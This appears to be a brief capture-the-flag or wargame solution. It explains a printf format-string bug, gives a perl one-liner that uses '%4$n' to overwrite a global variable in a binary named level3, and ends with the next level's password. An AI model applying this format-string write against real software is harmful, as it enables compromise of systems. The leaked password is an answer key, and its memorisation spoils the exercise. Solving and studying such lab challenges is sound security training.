Printf take the input string, with %n we can change a value, here we want to modify the m global, we write the a
dress of m and go to to the begin of the string

`perl -e 'open(my $fh, ">", "test"); print $fh "\x8c\x98\x04\x08" . "A"x60'` ; echo "%4\$n" >> test ; cat test - | ./level3

password lvl 4 : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
